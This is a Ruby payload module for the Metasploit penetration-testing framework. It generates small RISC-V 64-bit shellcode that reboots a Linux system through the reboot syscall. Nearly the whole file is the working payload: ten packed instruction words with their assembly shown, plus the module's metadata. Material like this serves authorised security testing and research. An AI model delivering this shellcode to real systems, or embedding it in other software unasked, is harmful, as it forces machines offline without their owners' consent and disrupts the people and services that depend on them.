##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 40

  include Msf::Payload::Single

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Reboot',
        'Description' => %q{
          A very small shellcode for rebooting the system using
          the reboot syscall. This payload is sometimes helpful
          for testing purposes. Requires CAP_SYS_BOOT privileges.
        },
        'Author' => 'bcoles',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_RISCV64LE,
        'References' => [
          ['URL', 'https://man7.org/linux/man-pages/man2/reboot.2.html'],
          ['URL', 'https://github.com/bcoles/shellcode/blob/main/riscv64/reboot/reboot.s'],
        ]
      )
    )
  end

  def generate(_opts = {})
    shellcode =
      [0x0007f537].pack('V*') + # lui    a0,0x7f
      [0x70f5051b].pack('V*') + # addiw  a0,a0,1807
      [0x00d51513].pack('V*') + # slli   a0,a0,0xd
      [0xead50513].pack('V*') + # addi   a0,a0,-339
      [0x281225b7].pack('V*') + # lui    a1,0x28122
      [0x9695859b].pack('V*') + # addiw  a1,a1,-1687
      [0x01234637].pack('V*') + # lui    a2,0x1234
      [0x5676061b].pack('V*') + # addiw  a2,a2,1383
      [0x08e00893].pack('V*') + # li     a7,142
      [0x00000073].pack('V*')   # ecall

    super.to_s + shellcode
  end
end
